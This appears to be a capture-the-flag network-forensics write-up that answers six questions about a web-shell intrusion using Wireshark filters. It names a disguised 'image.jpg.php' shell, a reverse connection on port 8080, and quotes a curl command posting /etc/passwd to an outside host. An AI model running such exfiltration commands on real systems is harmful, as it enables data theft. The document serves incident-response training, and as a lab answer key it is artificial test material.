1. Identifying the geographical origin of the attack facilitates the implementation of geo-blocking measures and the analysis of threat intelligence. From which city did the attack originate?

=> Statitics -> Conversations -> IPv4 -> 1 IP: 117.11.88.124
=> search IP treen https://ip.teoh.io/vpn-detection => Tianjin

2. Knowing the attacker's User-Agent assists in creating robust filtering rules. What's the attacker's Full User-Agent?

ip.src == 117.11.88.124 && http
=> Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

3. We need to determine if any vulnerabilities were exploited. What is the name of the malicious web shell that was successfully uploaded?

ip.src == 117.11.88.124 && http.request.method == POST
=> Packet 63 and see file "image.jpg.php"

4. Identifying the directory where uploaded files are stored is crucial for locating the vulnerable page and removing any malicious files. Which directory is used by the website to store the uploaded files?

=> follow the tcp stream from packet 63
=> stream 12 with "GET /reviews/uploads/image.jpg.php HTTP/1.1"
=> stream 13 see the command were running in the server

5. Which port, opened on the attacker's machine, was targeted by the malicious web shell for establishing unauthorized outbound communication?

=> Stream 13 with packet 140 see port 8080 were opend at IP "117.11.88.124"

6. Recognizing the significance of compromised data helps prioritize incident response actions. Which file was the attacker attempting to exfiltrate?

=> at stream 13 see command: "curl -X POST -d /etc/passwd http://***:443/" 
